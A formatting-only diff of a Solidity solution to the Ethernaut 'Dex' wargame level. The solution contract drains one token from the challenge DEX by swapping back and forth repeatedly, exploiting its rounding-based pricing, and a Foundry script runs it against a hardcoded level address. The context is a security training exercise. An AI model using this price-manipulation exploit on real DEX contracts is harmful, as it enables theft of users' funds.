@@ -1,9 +1,9 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.6.0;
 
-import { Script } from "forge-std/Script.sol";
-import { EthernautScript } from "src/common/EthernautScript.sol";
-import { Dex } from "./Problem.sol";
+import {Script} from "forge-std/Script.sol";
+import {EthernautScript} from "src/common/EthernautScript.sol";
+import {Dex} from "./Problem.sol";
 import "openzeppelin-contracts/token/ERC20/IERC20.sol";
 
 contract Solution {
@@ -13,14 +13,17 @@ contract Solution {
         address outputToken = _dex.token2();
         address tmp;
 
-        IERC20(inputToken).transferFrom(msg.sender, address(this), _dex.balanceOf(inputToken, msg.sender));
-        uint outputTokenBalance = _dex.balanceOf(outputToken, address(_dex));
-        uint inputAmount = _dex.balanceOf(inputToken, address(this));
+        IERC20(inputToken).transferFrom(
+            msg.sender, address(this), _dex.balanceOf(inputToken, msg.sender)
+        );
+        uint256 outputTokenBalance = _dex.balanceOf(outputToken, address(_dex));
+        uint256 inputAmount = _dex.balanceOf(inputToken, address(this));
         require(inputAmount > 0, "No input token balance");
-        uint swapCount;
-        while(inputAmount < 110) {
-            uint inputTokenForAllOutput = _dex.balanceOf(inputToken, address(_dex));
-            if(inputTokenForAllOutput < inputAmount) { 
+        uint256 swapCount;
+        while (inputAmount < 110) {
+            uint256 inputTokenForAllOutput =
+                _dex.balanceOf(inputToken, address(_dex));
+            if (inputTokenForAllOutput < inputAmount) {
                 inputAmount = inputTokenForAllOutput;
             }
             _dex.swap(inputToken, outputToken, inputAmount);
@@ -31,13 +34,15 @@ contract Solution {
             inputAmount = _dex.balanceOf(inputToken, address(this));
             ++swapCount;
         }
-        require(_dex.balanceOf(inputToken, address(_dex)) == 0, "Input token balance should be 0");
+        require(
+            _dex.balanceOf(inputToken, address(_dex)) == 0,
+            "Input token balance should be 0"
+        );
         IERC20(inputToken).transfer(msg.sender, inputAmount);
     }
 }
 
 contract SolutionScript is EthernautScript {
-
     function solve(address payable _instanceAddress) internal override {
         Dex dex = Dex(_instanceAddress);
         address token1 = dex.token1();
@@ -51,9 +56,7 @@ contract SolutionScript is EthernautScript {
         assert(dex.balanceOf(token1, address(dex)) == 0);
     }
 
-    function getLevelAddress() internal view override returns(address) {
+    function getLevelAddress() internal view override returns (address) {
         return 0xC084FC117324D7C628dBC41F17CAcAaF4765f49e;
     }
-
 }
-
